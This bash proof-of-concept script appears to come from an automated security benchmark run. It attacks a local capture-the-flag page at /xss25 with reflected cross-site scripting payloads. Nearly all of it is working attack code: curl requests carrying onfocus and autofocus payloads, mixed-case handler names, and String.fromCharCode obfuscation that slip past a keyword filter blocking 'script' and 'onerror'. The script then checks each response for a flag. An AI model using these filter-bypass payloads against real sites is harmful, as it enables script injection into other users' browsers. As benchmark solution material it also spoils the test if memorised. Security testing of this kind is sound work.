#!/bin/bash
# POC: Demonstrates reflected XSS via onfocus event handler bypass with String.fromCharCode obfuscation on /xss25 endpoint
# Target: ./repo
# Created: 2025-11-05T17:27:38.466Z
# Session: benchmark-XBEN-004-24-mhm9gmmb

# XSS via onfocus Event Handler Bypass POC
# Target: http://localhost:5001/xss25
# Parameter: solution (POST)
# Vulnerability: Reflected XSS with keyword filter bypass

TARGET="http://localhost:5001/xss25"
echo "[*] Testing Reflected XSS vulnerability via onfocus event handler"
echo "[*] Target: $TARGET"
echo ""

# Test 1: img tag with onfocus and String.fromCharCode obfuscation
echo "[+] Test 1: img tag with onfocus event handler"
PAYLOAD1='<img src=x onfocus=alert(String.fromCharCode(88,83,83))>'
echo "[*] Payload: $PAYLOAD1"
RESPONSE1=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD1")

if echo "$RESPONSE1" | grep -q "Congratulations"; then
    echo "[✓] SUCCESS: XSS executed - Response contains 'Congratulations'"
    echo "[✓] Flag found in response"
    echo ""
else
    echo "[✗] FAILED: Response does not indicate successful XSS"
    echo "[*] Response snippet: $(echo "$RESPONSE1" | head -c 200)"
    echo ""
fi

# Test 2: Case variation - OnFocus (mixed case)
echo "[+] Test 2: img tag with OnFocus (case variation)"
PAYLOAD2='<img src=x OnFocus=alert(String.fromCharCode(88,83,83))>'
echo "[*] Payload: $PAYLOAD2"
RESPONSE2=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD2")

if echo "$RESPONSE2" | grep -q "Congratulations"; then
    echo "[✓] SUCCESS: Case variation bypass works"
    echo "[✓] Flag found in response"
    echo ""
else
    echo "[✗] FAILED: Case variation did not bypass filter"
    echo ""
fi

# Test 3: button tag with autofocus attribute
echo "[+] Test 3: button tag with onfocus and autofocus attributes"
PAYLOAD3='<button onfocus=alert(String.fromCharCode(88,83,83)) autofocus>xss</button>'
echo "[*] Payload: $PAYLOAD3"
RESPONSE3=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD3")

if echo "$RESPONSE3" | grep -q "Congratulations"; then
    echo "[✓] SUCCESS: button tag with autofocus triggers XSS"
    echo "[✓] Flag found in response"
    echo ""
else
    echo "[✗] FAILED: button tag payload did not work"
    echo ""
fi

# Test 4: textarea tag with autofocus
echo "[+] Test 4: textarea tag with onfocus and autofocus attributes"
PAYLOAD4='<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>xss</textarea>'
echo "[*] Payload: $PAYLOAD4"
RESPONSE4=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD4")

if echo "$RESPONSE4" | grep -q "Congratulations"; then
    echo "[✓] SUCCESS: textarea tag with autofocus triggers XSS"
    echo "[✓] Flag found in response"
    echo ""
else
    echo "[✗] FAILED: textarea tag payload did not work"
    echo ""
fi

# Test 5: Confirm that blocked keywords are still filtered
echo "[+] Test 5: Verify that 'script' tag is still blocked (control test)"
PAYLOAD5='<script>alert(1)</script>'
echo "[*] Payload: $PAYLOAD5"
RESPONSE5=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD5")

if echo "$RESPONSE5" | grep -q "Sorry you can't use"; then
    echo "[✓] CONFIRMED: 'script' keyword is properly blocked"
    echo ""
else
    echo "[✗] WARNING: 'script' keyword was not blocked as expected"
    echo ""
fi

# Test 6: Confirm that 'onerror' is blocked (control test)
echo "[+] Test 6: Verify that 'onerror' is blocked (control test)"
PAYLOAD6='<img src=x onerror=alert(1)>'
echo "[*] Payload: $PAYLOAD6"
RESPONSE6=$(curl -s -X POST "$TARGET" -d "solution=$PAYLOAD6")

if echo "$RESPONSE6" | grep -q "Sorry you can't use"; then
    echo "[✓] CONFIRMED: 'onerror' keyword is properly blocked"
    echo ""
else
    echo "[✗] WARNING: 'onerror' keyword was not blocked as expected"
    echo ""
fi

echo "[+] POC Testing Complete"
echo "[*] Summary: onfocus event handler successfully bypasses keyword filter"
echo "[*] The application is vulnerable to reflected XSS attacks"